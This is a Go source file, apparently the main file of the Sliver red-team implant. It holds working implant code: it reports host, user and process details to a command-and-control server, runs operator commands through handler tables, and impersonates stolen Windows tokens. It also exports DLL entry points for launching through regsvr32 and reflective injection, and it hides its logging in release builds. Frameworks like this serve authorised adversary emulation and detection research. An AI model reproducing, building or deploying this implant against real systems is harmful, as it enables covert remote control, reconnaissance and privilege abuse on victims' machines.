package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
//#include "sliver.h"
import "C"

// {{end}}

import (
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Config.Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	"log"

	"github.com/bishopfox/sliver/protobuf/sliverpb"

	// {{if eq .Config.GOOS "windows"}}
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/limits"
	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/implant/sliver/version"

	"github.com/golang/protobuf/proto"

	// {{if .Config.IsService}}
	"golang.org/x/sys/windows/svc"
	// {{end}}
)

// {{if .Config.IsService}}

type sliverService struct{}

func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
	for {
		select {
		default:
			connection := transports.StartConnectionLoop()
			if connection == nil {
				break
			}
			mainLoop(connection)
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
			case svc.Pause:
				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
			}
		}
	}
	return
}

// {{end}}

// {{if or .Config.IsSharedLib .Config.IsShellcode}}

var isRunning bool = false

// RunSliver - Export for shared lib build
//export RunSliver
func RunSliver() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
// export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
// export DllUnregisterServer
func DllUnregisterServer() { main() }

// {{end}}

func main() {

	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	// {{if .Config.IsService}}
	svc.Run("", &sliverService{})
	// {{else}}
	for {
		connection := transports.StartConnectionLoop()
		if connection == nil {
			break
		}
		mainLoop(connection)
	}
	// {{end}}
}

func mainLoop(connection *transports.Connection) {

	connection.Send <- getRegisterSliver() // Send registration information

	// Reconnect active pivots
	pivots.ReconnectActivePivots(connection)

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	sysPivotHandlers := handlers.GetSystemPivotHandlers()
	specialHandlers := handlers.GetSpecialHandlers()

	for envelope := range connection.Recv {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, connection)
		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if eq .Config.GOOS "windows" }}
			if priv.CurrentToken != 0 {
				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("Error: %v\n", err)
					// {{end}}
				}
			}
			// {{end}}

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				connection.Send <- &sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			connection.Send <- &sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			}
		}
	}
}

func getRegisterSliver() *sliverpb.Envelope {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// Retrieve UUID
	uuid := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Uuid: %s", uuid)
	// {{end}}

	data, err := proto.Marshal(&sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Uuid:              uuid,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(),
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ActiveC2:          transports.GetActiveC2(),
		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
		ProxyURL:          transports.GetProxyURL(),
	})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: sliverpb.MsgRegister,
		Data: data,
	}
}
